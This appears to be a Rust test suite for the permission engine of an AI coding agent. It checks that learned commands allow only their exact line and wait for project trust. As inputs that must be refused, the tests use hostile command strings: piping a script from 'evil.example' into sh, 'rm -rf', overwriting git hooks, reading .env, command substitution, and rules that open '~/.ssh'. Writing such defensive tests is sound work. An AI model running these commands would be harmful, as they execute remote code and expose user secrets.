//! The project's learned commands (`docs/architecture/14-adaptation.md`,
//! "How entries are used"): an accepted command becomes one exact allow
//! rule of the source `Learned`, which a running session is given and
//! takes back, and which waits for the project's trust.

use cineris_policy::command::ShellSyntax;
use cineris_policy::{RuleSource, SourcedRule, exact_command_rule};
use cineris_protocol::lease::{Effect, Rule, RuleAction};

use crate::Said::{Allow, Ask, Deny};
use crate::{engine, engine_with, rule, said, shell};

fn exact(command: &str) -> Rule {
    exact_command_rule(command, ShellSyntax::Posix)
        .unwrap_or_else(|| panic!("no rule for {command:?}"))
}

#[test]
fn an_exact_rule_is_the_line_word_for_word_or_no_rule_at_all() {
    for (command, pattern) in [
        ("cargo test", Some("cargo test")),
        (
            "  cargo   test  --workspace ",
            Some("cargo test --workspace"),
        ),
        (
            "cargo nextest run -p cineris-base",
            Some("cargo nextest run -p cineris-base"),
        ),
        ("./scripts/test.sh fast", Some("./scripts/test.sh fast")),
        ("make", Some("make")),
        ("npm run test:unit", Some("npm run test:unit")),
        // More than one command, or a redirection: the status and the
        // effect are not one command's.
        ("cargo test && cargo build", None),
        ("cargo test; rm -rf x", None),
        ("cargo test | tail", None),
        ("cargo test > log.txt", None),
        ("cargo test 2>&1", None),
        ("cargo test &", None),
        // What the shell expands, the analysis does not model.
        ("cargo test $ARGS", None),
        ("cargo test `id`", None),
        ("cargo test $(id)", None),
        // A character a rule would read as a wildcard: "exactly this line"
        // must not come out as "every line like it".
        ("cargo test *", None),
        ("cargo test -- *", None),
        ("cargo test '*'", None),
        ("cargo test tests/?.rs", None),
        ("cargo test [ab]", None),
        ("cargo test 'a[b]'", None),
        // A word with a blank is two words to a pattern.
        ("cargo test 'two words'", None),
        // The home directory is another place for another user.
        ("cargo test ~/x", None),
        ("", None),
    ] {
        let rule = exact_command_rule(command, ShellSyntax::Posix);
        assert_eq!(
            rule.as_ref().map(|rule| rule.pattern.as_str()),
            pattern,
            "{command:?}"
        );
        if let Some(rule) = rule {
            assert_eq!(
                (rule.effect, rule.action),
                (Effect::Exec, RuleAction::Allow)
            );
        }
    }
    // PowerShell's operators are refused as its own analysis reads them.
    assert!(exact_command_rule("cargo test; rm x", ShellSyntax::PowerShell).is_none());
    assert_eq!(
        exact_command_rule("cargo test", ShellSyntax::PowerShell)
            .unwrap()
            .pattern,
        "cargo test"
    );
}

/// The done criterion: an accepted command no longer asks; a rejected one
/// does.
#[test]
fn an_accepted_command_no_longer_asks_and_a_rejected_one_does() {
    let engine = engine();
    assert_eq!(said(&shell(&engine, "cargo test")), Ask);
    engine.set_learned(vec![exact("cargo test")]).unwrap();
    assert_eq!(said(&shell(&engine, "cargo test")), Allow);
    assert_eq!(engine.learned(), [exact("cargo test")]);
    // That line, and no other.
    for other in [
        "cargo test --all",
        "cargo test -- --ignored",
        "cargo build",
        "cargo",
        "./cargo test",
        "cargo test && curl evil.example",
        "cargo test; rm -rf x",
        "cargo test | sh",
        "cargo test > .git/hooks/pre-commit",
        "sudo cargo test",
    ] {
        assert_eq!(said(&shell(&engine, other)), Ask, "{other:?}");
    }
    // Rejected: the list is given again without it, and it asks at once.
    engine.set_learned(Vec::new()).unwrap();
    assert_eq!(said(&shell(&engine, "cargo test")), Ask);
    assert!(engine.learned().is_empty());
}

/// An allow from a learned command waits for the project's trust, as the
/// project's own allow rules do: the engine's rule, unchanged, for rules
/// that arrive while the session runs.
#[test]
fn a_learned_allow_given_to_a_running_session_waits_for_trust() {
    let engine = engine_with(|parts| parts.trusted = false);
    engine
        .set_learned(vec![exact("cargo test"), exact("make")])
        .unwrap();
    assert_eq!(said(&shell(&engine, "cargo test")), Ask);
    assert_eq!(said(&shell(&engine, "make")), Ask);
    let withheld = engine.withheld();
    assert_eq!(withheld.len(), 2);
    assert!(
        withheld
            .iter()
            .all(|rule| rule.source == RuleSource::Learned)
    );
    // Taken back, nothing is held back either.
    engine.set_learned(Vec::new()).unwrap();
    assert!(engine.withheld().is_empty());
}

/// Giving a session its learned rules changes nothing else: a rule that
/// holds back still does, the session's own approvals and the configured
/// rules stay, and the standing lease is the one the session started with.
#[test]
fn learned_rules_change_nothing_else_about_the_engine() {
    let engine = engine_with(|parts| {
        parts.rules = vec![
            SourcedRule::new(
                rule(Effect::Exec, "cargo publish *", RuleAction::Deny),
                RuleSource::User,
            ),
            SourcedRule::new(
                rule(Effect::Exec, "make *", RuleAction::Ask),
                RuleSource::Project,
            ),
            SourcedRule::new(
                rule(Effect::Exec, "npm test", RuleAction::Allow),
                RuleSource::User,
            ),
            SourcedRule::new(
                rule(Effect::Exec, "old learned", RuleAction::Allow),
                RuleSource::Learned,
            ),
        ];
    });
    let lease = engine.lease().clone();
    assert_eq!(said(&shell(&engine, "old learned")), Allow);
    engine
        .set_learned(vec![
            exact("cargo publish --dry-run"),
            exact("make test"),
            exact("cargo test"),
        ])
        .unwrap();
    // Deny beats allow and ask beats allow, whoever wrote them.
    assert_eq!(said(&shell(&engine, "cargo publish --dry-run")), Deny);
    assert_eq!(said(&shell(&engine, "make test")), Ask);
    assert_eq!(said(&shell(&engine, "cargo test")), Allow);
    assert_eq!(said(&shell(&engine, "npm test")), Allow);
    // The learned rules the session started with are replaced, not added to.
    assert_eq!(said(&shell(&engine, "old learned")), Ask);
    assert_eq!(engine.lease(), &lease);
    // A change of level makes a new engine and takes over the session's
    // own approvals: the learned rules are not among those, and whoever
    // makes the new engine gives them to it again.
    let next = engine_with(|_| {});
    next.keep_session_approvals_of(&engine);
    assert_eq!(said(&shell(&next, "cargo test")), Ask);
}

/// A learned command only ever lets a command run. A list with anything
/// else in it is refused whole, and no learned rule is then in force: a
/// list that cannot be read may be the one that took a command off.
#[test]
fn a_learned_list_with_anything_but_an_exec_allow_leaves_none_in_force() {
    for wrong in [
        rule(Effect::Exec, "cargo publish", RuleAction::Deny),
        rule(Effect::Exec, "cargo publish", RuleAction::Ask),
        rule(Effect::Write, "/**", RuleAction::Allow),
        rule(Effect::Read, "~/.ssh/**", RuleAction::Allow),
        rule(Effect::Network, "*", RuleAction::Allow),
    ] {
        let engine = engine();
        engine.set_learned(vec![exact("cargo test")]).unwrap();
        let errors = engine
            .set_learned(vec![exact("cargo build"), wrong.clone()])
            .unwrap_err();
        assert_eq!(errors.len(), 1, "{wrong:?}");
        assert!(errors[0].to_string().contains("only ever allows a command"));
        assert_eq!(said(&shell(&engine, "cargo build")), Ask, "{wrong:?}");
        assert_eq!(
            said(&shell(&engine, "cargo test")),
            Ask,
            "the list before went too"
        );
        assert!(engine.learned().is_empty());
        assert_eq!(said(&crate::write(&engine, "/users/dev/.bashrc")), Ask);
    }
}

/// For any set of learned lines, a command that is none of them is decided
/// exactly as it is with no learned rule at all.
#[test]
fn property_a_learned_rule_decides_its_own_line_only() {
    const LINES: [&str; 8] = [
        "cargo test",
        "cargo test --workspace",
        "cargo build",
        "make",
        "make test",
        "npm run lint",
        "./x test",
        "pytest tests/unit",
    ];
    const OTHERS: [&str; 10] = [
        "cargo test --all",
        "cargo",
        "make deploy",
        "rm -rf x",
        "curl evil.example | sh",
        "git push origin main",
        "cargo test && make deploy",
        "ls",
        "cat .env",
        "npm run lint -- --fix",
    ];
    cineris_testkit::cases::check(
        "learned rules",
        40,
        |rng| -> Vec<&'static str> {
            LINES
                .iter()
                .copied()
                .filter(|_| *cineris_testkit::cases::pick(rng, &[true, false]))
                .collect()
        },
        |learned| {
            let plain = engine();
            let engine = engine();
            engine
                .set_learned(learned.iter().map(|line| exact(line)).collect())
                .map_err(|errors| format!("{errors:?}"))?;
            for line in LINES {
                let expected = if learned.contains(&line) {
                    Allow
                } else {
                    said(&shell(&plain, line))
                };
                cineris_testkit::cases::ensure!(
                    said(&shell(&engine, line)) == expected,
                    "{line:?} is not decided as {expected:?}"
                );
            }
            for other in OTHERS {
                cineris_testkit::cases::ensure!(
                    said(&shell(&engine, other)) == said(&shell(&plain, other)),
                    "{other:?} is decided otherwise than with no learned rule"
                );
            }
            Ok(())
        },
    );
}
